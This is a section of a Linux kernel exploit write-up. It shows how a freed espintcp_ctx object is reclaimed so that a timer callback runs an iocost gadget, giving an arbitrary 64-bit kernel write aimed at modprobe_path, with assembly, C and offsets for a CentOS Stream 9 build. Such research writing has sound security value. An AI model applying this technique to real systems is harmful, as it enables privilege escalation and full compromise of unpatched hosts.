# Delta Callback Gadget

After the freed `espintcp_ctx` allocation is reclaimed, timer expiry consumes
the replacement bytes. `expire_timers()` detaches `msg_timer_work.timer` and
reads `fn = timer->function`; `call_timer_fn()` then invokes `fn(timer)`. On
x86-64, the timer pointer is passed in `RDI`. The replacement allocation thus
supplies both the callback address and the callback's RDI-relative operands,
which are arranged to produce a controlled 64-bit kernel-memory write.

## Callback Data Flow

The selected callback entry is inside `iocg_flush_stat_upward()` in
`block/blk-iocost.c`. The instruction sequence below shows normalized
RDI-relative offsets. The offsets observed in the target build are mapped later.

```asm
mov eax, [rdi+0x1a0]
test eax, eax
jle done
sub eax, 1

mov rdx, [rdi+0x138]
sub rdx, [rdi+0x158]
mov rax, [rdi+rax*8+0x1a8]
add [rax+0x138], rdx

mov rdx, [rdi+0x140]
sub rdx, [rdi+0x160]
add [rax+0x140], rdx

mov rdx, [rdi+0x148]
sub rdx, [rdi+0x168]
add [rax+0x148], rdx

mov rdx, [rdi+0x150]
sub rdx, [rdi+0x170]
add [rax+0x150], rdx

done:
mov rax, [rdi+0x138]
mov [rdi+0x158], rax
mov rax, [rdi+0x140]
mov [rdi+0x160], rax
mov rax, [rdi+0x148]
mov [rdi+0x168], rax
mov rax, [rdi+0x150]
mov [rdi+0x170], rax
ret
```

The source-level equivalent is:

```c
level = *(s32 *)(rdi + 0x1a0);

if (level > 0) {
        parent = *(u64 *)(rdi + 0x1a8 + 8 * (level - 1));

        *(u64 *)(parent + 0x138) +=
                *(u64 *)(rdi + 0x138) - *(u64 *)(rdi + 0x158);
        *(u64 *)(parent + 0x140) +=
                *(u64 *)(rdi + 0x140) - *(u64 *)(rdi + 0x160);
        *(u64 *)(parent + 0x148) +=
                *(u64 *)(rdi + 0x148) - *(u64 *)(rdi + 0x168);
        *(u64 *)(parent + 0x150) +=
                *(u64 *)(rdi + 0x150) - *(u64 *)(rdi + 0x170);
}

*(u64 *)(rdi + 0x158) = *(u64 *)(rdi + 0x138);
*(u64 *)(rdi + 0x160) = *(u64 *)(rdi + 0x140);
*(u64 *)(rdi + 0x168) = *(u64 *)(rdi + 0x148);
*(u64 *)(rdi + 0x170) = *(u64 *)(rdi + 0x150);
```

Each addition uses the difference between an accumulator and its corresponding
base value. The callback then copies every accumulator into its base field. The
parent lookup uses `8 * (level - 1)` as an array offset. Setting `level = 1`
makes that offset zero, selecting the first parent pointer at `rdi + 0x1a8`.

## Write Primitive

In the normalized sequence, the first addition writes to `parent + 0x138`.
Directing it to `target` therefore requires `target - 0x138` in the first
parent slot. Only the first accumulator pair needs a nonzero difference:

```c
*(u32 *)(rdi + 0x1a0) = 1;
*(u64 *)(rdi + 0x1a8) = target - 0x138;

delta = desired_value - old_value; /* modulo 2^64 */
*(u64 *)(rdi + 0x138) = delta;
*(u64 *)(rdi + 0x158) = 0;

*(u64 *)(rdi + 0x140) = *(u64 *)(rdi + 0x160);
*(u64 *)(rdi + 0x148) = *(u64 *)(rdi + 0x168);
*(u64 *)(rdi + 0x150) = *(u64 *)(rdi + 0x170);
```

The effect is:

```c
*(u64 *)target       += delta;
*(u64 *)(target + 8) += 0;
*(u64 *)(target + 16) += 0;
*(u64 *)(target + 24) += 0;
```

If the original qword is known, setting
`delta = desired_value - old_value` makes the callback's
`add qword ptr [target], delta` replace `old_value` with `desired_value`.

## Object Mapping

Timer expiry passes the embedded timer to the callback:

```c
rdi = &ctx->strp.msg_timer_work.timer;
```

The mapping uses two coordinate systems: sprayed fields are located relative
to `ctx`, while callback operands are addressed relative to `RDI`. `OFF_RDI`
locates the embedded timer within the reclaimed object and converts between
them:

```c
OFF_RDI = MSG_TIMER_LIST_OFF;
```

`kbase` is the randomized kernel base found at runtime. The mapping uses three
build-specific values:

| Parameter | Meaning |
| --- | --- |
| `target_func` | `address(callback entry) - kbase`; the timer callback is `kbase + target_func`. |
| `WRITE_TARGET_OFFSET` | `address(modprobe_path) - kbase`; selects its first qword. |
| `TARGET_FIELD_SHIFT` | Uniform displacement between the normalized and target-build RDI-relative operands. |

All three values are build-specific and must match the same `vmlinux`.

The RDI-relative operands depend on compiler output. Their normalized form uses
`0x1a0` for the level, `0x1a8` for the first parent pointer, and
`0x138`/`0x158` for the first accumulator/base pair. `TARGET_FIELD_SHIFT` is
the difference between those normalized displacements and the corresponding
displacements in the target build.

For the analyzed CentOS Stream 9 kernel, every relevant operand is displaced by
`0x10`, so `TARGET_FIELD_SHIFT = 0x10`:

```text
0x1a0 -> 0x1b0    level operand   -> OFF_LEVEL
0x1a8 -> 0x1b8    parent[0]       -> OFF_PARENT0
0x138 -> 0x148    accumulator 0   -> OFF_ACC0
0x140 -> 0x150    accumulator 1   -> OFF_ACC1
0x148 -> 0x158    accumulator 2   -> OFF_ACC2
0x150 -> 0x160    accumulator 3   -> OFF_ACC3
0x158 -> 0x168    base 0          -> OFF_BASE0
0x160 -> 0x170    base 1          -> OFF_BASE1
0x168 -> 0x178    base 2          -> OFF_BASE2
0x170 -> 0x180    base 3          -> OFF_BASE3
```

The callback does not write directly through the sprayed parent pointer. Its
first addition uses the normalized write displacement `0x138`, which becomes
`0x138 + TARGET_FIELD_SHIFT` in the target build. The sprayed parent pointer is
adjusted backward by `WRITE_TARGET_ADJ` so the addition lands at
`kbase + WRITE_TARGET_OFFSET`:

```c
WRITE_TARGET_ADJ = 0x138 + TARGET_FIELD_SHIFT;
parent = kbase + WRITE_TARGET_OFFSET - WRITE_TARGET_ADJ;
```

Finally, adding `OFF_RDI` converts each callback-relative operand into its
offset within the reclaimed `espintcp_ctx`:

```c
OFF_LEVEL   = OFF_RDI + 0x1a0 + TARGET_FIELD_SHIFT;
OFF_PARENT0 = OFF_RDI + 0x1a8 + TARGET_FIELD_SHIFT;
OFF_ACC0    = OFF_RDI + 0x138 + TARGET_FIELD_SHIFT;
OFF_BASE0   = OFF_RDI + 0x158 + TARGET_FIELD_SHIFT;
```
